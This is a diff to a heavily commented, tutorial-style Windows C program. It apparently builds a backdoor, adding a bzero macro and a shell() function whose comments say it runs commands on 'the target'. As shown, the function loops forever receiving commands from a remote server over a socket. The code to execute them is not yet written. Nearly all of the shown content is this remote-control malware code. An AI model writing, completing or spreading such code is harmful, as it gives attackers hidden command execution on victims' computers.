@@ -13,8 +13,48 @@
 #include <wininet.h> //Allow program to do internet options like downloading and uploading.
 #include <windowsx.h> //Allows to do extra macro functions to make windows program easier.
 
+#define bzero(p, size) (void) memset((p), 0, (size)) //Perfoam a same task like memset function does.
+//bzero take parameter and the memory size as a input.
+//define memset funtion for the following inputs.
+//0 for overwrite the values by zero.
+
+
 //Global Variable denotes here
 int sock;
+
+//Let's code shell void function that doesn't return any output it perfoam argument execution.
+//this shell function is able to executable commands in the target.
+void shell()
+{
+
+  //allocate variables.
+    char buffer[1024]; // This variable used to receive the execution command from the server it consist of 1024 bytes of memory.
+    //The container might be used to store a smaller portion of the output (e.g., part of the command's result), and then the data in container would be added to the total_response buffer, which accumulates the complete output from multiple read.
+    char container[1024]; 
+    char total_reponse[18384];
+
+
+    //After creating variable jump into while true loop >> represent as "while (1)"
+    while (1)
+    {
+      jump:
+      //let's allocate the memory as zeros for all variables that we have declared.
+      //the best practice to do calling sizeof function to particular variable that has been declared.
+      bzero(buffer, 1024);//manually giving the size here.
+      bzero(container, 1024);//same as above
+      bzero(total_reponse, sizeof(total_reponse));//same operation as above.
+
+
+      //Next our shell want to receive the command from the server let's perfoam.
+      //recv functtion take 4 arguments lets explain
+      //1st where we want to receive the command? > From Socket. that is the argument.
+      //2nd  want to store the command that received from ther server > That is buffer variable.
+      //3rd size of the buffer variable.
+      //4th argument is 0, because not specify any argument beside the function.
+      recv(sock, buffer, 1024, 0);
+    }
+}
+
 
 //Let's Start the main function
 // This function is returning integer that why we specify int int the function.
